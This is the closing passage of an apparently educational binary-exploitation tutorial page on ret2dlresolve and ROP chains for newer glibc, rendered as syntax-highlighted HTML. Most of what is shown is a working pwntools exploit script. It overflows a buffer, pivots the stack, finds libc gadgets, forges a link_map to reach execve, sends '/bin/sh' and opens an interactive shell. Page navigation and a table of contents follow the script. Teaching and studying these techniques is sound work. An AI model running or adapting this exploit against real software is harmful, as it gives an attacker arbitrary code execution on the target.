style="color:#36acaa">8</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># set rsi=writable+8</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">send</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&quot;A&quot;</span><span class="token operator" style="color:#393A34">*</span><span class="token number" style="color:#36acaa">0x80</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">writable</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">8</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0x80</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">read_gadget</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># pivot to top, call read() to do the same read() as above</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">time</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sleep</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">send</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&quot;B&quot;</span><span class="token operator" style="color:#393A34">*</span><span class="token number" style="color:#36acaa">0x80</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">writable</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0xf00</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">leave_ret</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ljust</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0xf00</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\x00&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">plt</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">read</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rop </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ROP</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">libc</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pop_rdi </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> rop</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">find_gadget</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">&quot;pop rdi&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;ret&quot;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">address</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pop_rsi </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> rop</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">find_gadget</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">&quot;pop rsi&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;ret&quot;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">address</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pop_rdx_r12 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> rop</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">find_gadget</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">&quot;pop rdx&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;pop r12&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;ret&quot;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">address</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rop </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Gadget</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">pop_rdi</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x404ff8</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Gadget</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">pop_rsi</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Gadget</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">pop_rdx_r12</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Gadget</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">execve</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">link_map</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> rop </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> dlrop</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">rop</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> writable</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> libc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">read</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> link_map</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ljust</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0xf10</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\x00&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> rop</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> payload</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ljust</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0xff8</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\x00&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;/bin/sh\x00&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">time</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sleep</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">send</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">interactive</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div></div></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/pwn/rop-2.34+/controlling-rax"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Controlling rax</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/pwn/rop-2.34+/other-gadgets"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Other gadgets</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#classic-ret2dlresolve" class="table-of-contents__link toc-highlight">Classic ret2dlresolve</a><ul><li><a href="#shared-libraries" class="table-of-contents__link toc-highlight">Shared libraries</a></li><li><a href="#plt-and-got" class="table-of-contents__link toc-highlight">PLT and GOT</a></li><li><a href="#dl_runtime_resolve_xsavec" class="table-of-contents__link toc-highlight">_dl_runtime_resolve_xsavec</a></li><li><a href="#dynamic-section" class="table-of-contents__link toc-highlight">Dynamic section</a></li><li><a href="#dl_fixup" class="table-of-contents__link toc-highlight">_dl_fixup</a></li><li><a href="#attack-idea" class="table-of-contents__link toc-highlight">Attack idea</a></li><li><a href="#attack-demo" class="table-of-contents__link toc-highlight">Attack demo</a></li></ul></li><li><a href="#function-oriented-programming" class="table-of-contents__link toc-highlight">Function-oriented programming</a><ul><li><a href="#attack-scenario" class="table-of-contents__link toc-highlight">Attack scenario</a></li><li><a href="#arbitrary-write" class="table-of-contents__link toc-highlight">Arbitrary write</a></li><li><a href="#ret2gets-payload" class="table-of-contents__link toc-highlight">ret2gets payload</a></li><li><a href="#exploit-script" class="table-of-contents__link toc-highlight">Exploit script</a></li><li><a href="#alternative-payloads" class="table-of-contents__link toc-highlight">Alternative payloads</a></li></ul></li><li><a href="#arbitrary-rop-chains" class="table-of-contents__link toc-highlight">Arbitrary rop chains</a><ul><li><a href="#attack-scenario" class="table-of-contents__link toc-highlight">Attack scenario</a></li><li><a href="#deadend-with-r_addend" class="table-of-contents__link toc-highlight">Deadend with r_addend</a></li><li><a href="#faking-link-maps" class="table-of-contents__link toc-highlight">Faking link maps</a></li><li><a href="#revisiting-_dl_fixup" class="table-of-contents__link toc-highlight">Revisiting _dl_fixup</a></li><li><a href="#writing-to-memory" class="table-of-contents__link toc-highlight">Writing to memory</a></li><li><a href="#exploit-script" class="table-of-contents__link toc-highlight">Exploit script</a></li></ul></li></ul></div></div></div></div></main></div></div></div></div>
</body>
</html>